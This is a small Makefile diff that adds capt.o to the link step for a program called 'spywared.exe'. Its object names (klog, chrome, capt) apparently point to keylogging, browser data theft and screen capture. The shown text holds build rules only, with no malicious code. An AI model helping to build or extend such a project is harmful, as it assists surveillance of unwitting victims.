@@ -1,7 +1,7 @@
 CXXFLAGS = -Wall -Wextra -pedantic -std=c++17
 
 spywared.exe: main.o write.o klog.o chrome.o capt.o sqlite3.o
-	g++ $(CXXFLAGS) main.o write.o klog.o chrome.o sqlite3.o -o spywared.exe
+	g++ $(CXXFLAGS) main.o write.o klog.o chrome.o capt.o sqlite3.o -o spywared.exe
 
 klog.o: klog.cpp klog.h
 	g++ $(CXXFLAGS) -c klog.cpp
